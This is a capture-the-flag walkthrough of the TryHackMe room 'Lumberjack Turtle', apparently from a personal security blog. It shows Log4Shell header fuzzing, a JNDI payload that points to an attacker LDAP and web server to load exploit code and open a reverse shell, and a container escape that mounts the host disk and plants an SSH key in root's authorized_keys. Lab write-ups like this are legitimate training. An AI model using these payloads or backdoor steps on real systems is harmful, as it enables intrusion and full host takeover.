---
layout: post
title: 'Try Hack Me - Lumberjack Turtle'
disass:
  - url: /assets/img/thm-lumberjackturtle/lumberjackturtle-1.png
    image_path: /assets/img/thm-lumberjackturtle/lumberjackturtle-1.png
    title: description
  - url: /assets/img/thm-lumberjackturtle/lumberjackturtle-2.png
    image_path: /assets/img/thm-lumberjackturtle/lumberjackturtle-2.png
    title: other
categories:
  - tryhackme
slug: thm-lumberjack-turtle
tags:
  - linux
  - java
  - log4shell
  - docker
---
## Challenge description

[https://tryhackme.com/room/lumberjackturtle](https://tryhackme.com/room/lumberjackturtle)

![description](/assets/img/thm-lumberjackturtle/lumberjackturtle-1.png "description")

## Reconnaissance / Enumeration

### Port scanning and service identification

```
$ rustscan -a $ip -r 1-65535 -- -A -sC
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍
[...]
PORT   STATE SERVICE     REASON  VERSION
22/tcp open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6a:a1:2d:13:6c:8f:3a:2d:e3:ed:84:f4:c7:bf:20:32 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCnZPtl8mVLJYrSASHm7OakFUsWHrIN9hsDpkfVuJIrX9yTG0yhqxJI1i8dbI/MrexUGrIGzYbgLpYgKGsH4Q4dxB9bj507KQaTLWXwogdrkCVtP0WuGCo2EPZKorU85EWZAhrefG1Pzj3lAx1IdaxTHIS5zTqEJSZYttPF4BHb2avjKDVfSA+4cLP7ybq0rgohJ7JLG5+1dR/ijrGpaXnfudm/9BVjiKcGMlENS6bQ+a32Fs7wxL5c7RfKoR0CjA+pROXrOj5blQM4CI4wrEdphPZ/900I4DJ+kA6Ga+NJF6donQOmmhjsEEpI6RYcz6n/4ql1bomnyyI+jayyf3t
|   256 1d:ac:5b:d6:7c:0c:7b:5b:d4:fe:e8:fc:a1:6a:df:7a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBPkLzZd9EQTP/90Y/G1/CYr+PGrh376Qm6aZTO0HZ7lCZ0dExE834/QZ1vNyQPk4jg1KmS09Mzjz1UWWtUCYLg=
|   256 13:ee:51:78:41:7e:3f:54:3b:9a:24:9b:06:e2:d5:14 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFdrmxj3Q5Et6BwEm7pC8cz5louqLoEAwNXGHi+3ee+t
80/tcp open  nagios-nsca syn-ack Nagios NSCA
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have a web server, apparantly nagio ncsa, running on port 80, which is unusual for this service that is normally running on port 5667 and a SSH server on port 22.

### Web Enumeration

There's nothing more than the home page that says :

> *What you doing here? There is nothing for you to C. Grab a cup of java and look deeper.*

After scratching my head for 10-15 minutes I tought about the room description :

> *What do lumberjacks and turtles have to do with this challenge?*
Hack into the machine. Get root.  You'll figure it out.

Lumberjack / Logging / Logs + Turtle / Shell = Log4Shell

So I launched a listener on ldap port (1389) and started fuzzing HTTP headers using Burp Suite. It didn't take long to get a hit, actually it worked on the first try, *accept* header :

![burpfuzz](/assets/img/thm-lumberjackturtle/lumberjackturtle-2.png "burpfuzz")

```
$ nc -lnvp 1389                                                      
listening on [any] 1389 ...
connect to [1.1.1.1] from (UNKNOWN) [10.10.105.211] 35244
0
 `�^C
```

It means we should be able to exploit this and get a foothold on the target

## Exploitation

To exploit the log4shell vulnerability, I used a [POC script by github's kozmer](https://github.com/kozmer/log4j-shell-poc.git)

[instructions source](https://www.hackingarticles.in/a-detailed-guide-on-log4j-penetration-testing/)

```
$ git clone https://github.com/kozmer/log4j-shell-poc
Cloning into 'log4j-shell-poc'...
remote: Enumerating objects: 205, done.
remote: Counting objects: 100% (202/202), done.
remote: Compressing objects: 100% (119/119), done.
remote: Total 205 (delta 74), reused 167 (delta 65), pack-reused 3
Receiving objects: 100% (205/205), 40.36 MiB | 73.67 MiB/s, done.
Resolving deltas: 100% (74/74), done.
$ cd log4j-shell-poc && wget https://mirrors.huaweicloud.com/java/jdk/8u202-b08/jdk-8u202-linux-x64.tar.gz
& tar xvzf jdk-8u202-linux-x64.tar.gz
& sudo mv jdk1.8.0_202 /usr/bin/

# we need to edit the script to fit jdk version/path
$ sed -i 's/jdk1.8.0_20/\/usr\/bin\/jdk1.8.0_202/' poc.py
$ python3 poc.py --userip 1.1.1.1 --webport 8000 --lport 4444

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://1.1.1.1:1389/a}
[+] Starting Webserver on port 8000 http://0.0.0.0:8000

Listening on 0.0.0.0:1389
```

In another terminal, start a netcat listener on port 4444:

```
 nc -lnvp 4444                                                   
listening on [any] 4444 ...
```

We just need to repeat the request with Burp Suite to get a shell

![burpexploit](/assets/img/thm-lumberjackturtle/lumberjackturtle-3.png "burpexploit")

```
Send LDAP reference result for a redirecting to http://1.1.1.1:8000/Exploit.class
10.10.105.211 - - [24/Jan/2022 03:56:42] "GET /Exploit.class HTTP/1.1" 200 -

connect to [1.1.1.1] from (UNKNOWN) [10.10.105.211] 55104
id && hostname
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
81fbbf1def70
```

We got a reverse shell on the target as root in what seems to be a docker container. Let's confirm this by checking for .dockerenv file :

```
ls -la /
total 68
drwxr-xr-x    1 root     root          4096 Dec 13 01:26 .
drwxr-xr-x    1 root     root          4096 Dec 13 01:26 ..
-rwxr-xr-x    1 root     root             0 Dec 13 01:25 .dockerenv
```
While we are here, let's get our first flag :

```
ls -la /opt
total 12
drwxr-xr-x    1 root     root          4096 Dec 11 21:04 .
drwxr-xr-x    1 root     root          4096 Dec 13 01:26 ..
-rw-r--r--    1 root     root            19 Dec 11 21:04 .flag1
cat /opt/.flag1
THM{REDACTED}
```

## Container Escape

So we are in a container, we now need to escape !

Let's start by listing disks :

```
ls -la /dev | grep disk
[...]
brw-rw----    1 root     disk      202,   0 Jan 24 01:15 xvda
brw-rw----    1 root     disk      202,   1 Jan 24 01:15 xvda1
brw-rw----    1 root     disk      202,  80 Jan 24 01:15 xvdf
brw-rw----    1 root     disk      202, 112 Jan 24 01:15 xvdh
```

Interesting, let's try to mount those disks :

```
mkdir /mnt/host
mount /dev/xvda1 /mnt/host
ls -la /mnt/host
total 100
drwxr-xr-x   22 root     root          4096 Jan 24 01:14 .
drwxr-xr-x    1 root     root          4096 Jan 24 03:18 ..
drwxr-xr-x    2 root     root          4096 Dec  8 16:04 bin
drwxr-xr-x    3 root     root          4096 Dec  8 16:03 boot
drwxr-xr-x    4 root     root          4096 Dec  8 16:03 dev
drwxr-xr-x   94 root     root          4096 Dec 13 02:21 etc
drwxr-xr-x    3 root     root          4096 Dec 13 01:25 home
lrwxrwxrwx    1 root     root            34 Dec  8 16:02 initrd.img -> boot/initrd.img-4.15.0-163-generic
lrwxrwxrwx    1 root     root            34 Dec  8 16:02 initrd.img.old -> boot/initrd.img-4.15.0-163-generic
drwxr-xr-x   20 root     root          4096 Dec 13 01:24 lib
drwxr-xr-x    2 root     root          4096 Dec  8 15:56 lib64
drwx------    2 root     root         16384 Dec  8 16:05 lost+found
drwxr-xr-x    2 root     root          4096 Dec  8 15:53 media
drwxr-xr-x    2 root     root          4096 Dec  8 15:53 mnt
drwxr-xr-x    3 root     root          4096 Dec 13 01:25 opt
drwxr-xr-x    2 root     root          4096 Apr 24  2018 proc
drwx------    6 root     root          4096 Jan 24 03:19 root
drwxr-xr-x    3 root     root          4096 Dec  8 16:04 run
drwxr-xr-x    2 root     root          4096 Dec 13 01:24 sbin
drwxr-xr-x    2 root     root          4096 Dec  8 15:53 srv
drwxr-xr-x    2 root     root          4096 Apr 24  2018 sys
drwxrwxrwt    8 root     root          4096 Jan 24 03:26 tmp
drwxr-xr-x   12 root     root          4096 Dec 13 01:25 usr
drwxr-xr-x   12 root     root          4096 Dec 13 01:24 var
lrwxrwxrwx    1 root     root            31 Dec  8 16:02 vmlinuz -> boot/vmlinuz-4.15.0-163-generic
lrwxrwxrwx    1 root     root            31 Dec  8 16:02 vmlinuz.old -> boot/vmlinuz-4.15.0-163-generic
```

That is our way out. Let's get ourself a backdoor (more like, let's create ourself a key to the frontdoor) :

```
cat 'ssh-rsa AAAA[....]=' >> /mnt/host/root/.ssh/authorized_keys

$ ssh root@$ip -i ./id_rsa
root@lumberjackturtle:~# id
uid=0(root) gid=0(root) groups=0(root)
```

We're out ! Let's get our last flag :

```
root@lumberjackturtle:~# cat root.txt
Pffft. Come on. Look harder.
root@lumberjackturtle:~# ls -laR
.:
total 36
[...]

/...:
total 12
drwxr-xr-x 2 root root 4096 Dec 13 01:25 .
drwx------ 6 root root 4096 Jan 24 03:19 ..
-r-------- 1 root root   26 Dec 13 01:25 ._fLaG2
root@lumberjackturtle:~# cat .../._fLaG2 
THM{REDACTED}
```

Thanks for reading <3

h3x
